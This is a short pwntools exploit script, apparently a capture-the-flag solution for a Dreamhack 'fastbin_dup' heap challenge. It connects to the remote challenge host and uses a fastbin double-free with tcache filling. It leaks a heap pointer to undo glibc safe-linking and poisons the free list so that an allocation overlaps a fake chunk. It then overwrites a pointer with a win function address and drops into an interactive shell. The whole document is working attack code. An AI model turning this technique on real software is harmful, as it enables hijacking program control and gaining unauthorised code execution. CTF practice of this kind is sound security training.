from pwn import *
#p = process('./fastbin_dup')
p = remote('host3.dreamhack.games', 10284)
e = ELF('./fastbin_dup')


win = e.symbols['win']


p.sendlineafter(b'name? ', b'A'*8 + p64(0x51))
p.recvuntil(b'memory ')
name_addr = int(p.recvn(14).decode (), 16)



def alloc(idx, size, content):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(size).encode())
    p.sendlineafter(b': ', content)

def free(idx):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())

def view(idx):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())

for _ in range(7):
    alloc(0, 0x40, b'AAAA')
    free(0)

alloc(0, 0x40, b'AAAA')
alloc(1, 0x40, b'AAAA')

free(0)
free(1)
free(0)

view(1)
leak = p.recvline()[:-1]
leak = u64(leak + b'\x00' * (8-len(leak)))
addr = leak ^ (leak >> 12) ^ (leak >> 24) ^ (leak >> 36)

target = (name_addr ) ^ (addr >> 12)
alloc(0, 0x40, p64(target))
alloc(0, 0x40, b'BBBBBBBB')
alloc(0, 0x40, b'CCCCCCCC')
alloc(0, 0x40, b'A'*0x18 + p64(win))

p.sendlineafter(b'>> ', b'0')
p.interactive()